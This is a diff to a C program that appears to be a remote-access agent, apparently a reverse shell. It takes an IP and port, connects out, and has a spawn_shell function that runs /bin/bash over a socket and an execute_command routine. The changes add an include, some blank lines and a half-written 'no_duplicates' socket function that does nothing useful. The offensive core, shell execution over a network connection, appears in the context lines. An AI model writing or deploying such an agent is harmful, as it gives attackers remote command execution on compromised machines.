@@ -1,3 +1,4 @@
+#include <asm-generic/socket.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -16,6 +17,7 @@ void spawn_shell(int socket) {
   char * const argv[] = {"/bin/bash",NULL};
   execvp("/bin/bash",argv);
 }
+
 
 void log_error(int socket, const char *error_msg){
   printf("[Info] Sending error to the server\n");
@@ -57,6 +59,7 @@ void establish_connection(int socket){
     printf("[Debug] Failed to send data\n");
   }     
   return;    
+
 }
 
 void execute_command(int socket, char *command) {
@@ -85,6 +88,18 @@ void execute_command(int socket, char *command) {
   return;
 }
 
+void no_duplicates() {
+  int loc_bind=1;
+  struct sockaddr_in addr;
+  int opt=1;
+  int sockd=-1;
+  if((sockd=socket(AF_INET, SOCK_STREAM, 0))==-1){
+    return;
+  }
+  setsockopt(sockd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
+  fcntl(sockd, F_SETFL, fcntl(sockd, F_GETFL) | O_NONBLOCK); 
+}
+
 int main(int argc, char *argv[]) {
   if(argc!=3) {
     printf("./agent <ip> <port>\n");
@@ -93,7 +108,9 @@ int main(int argc, char *argv[]) {
   int sockd;
   char *ip=argv[1];
   int port =atoi(argv[2]);  
+
   struct sockaddr_in server_addr; 
+
   sockd=socket(AF_INET,SOCK_STREAM,0);
   if(sockd<0){
     perror("[Err] Failed socket creation");
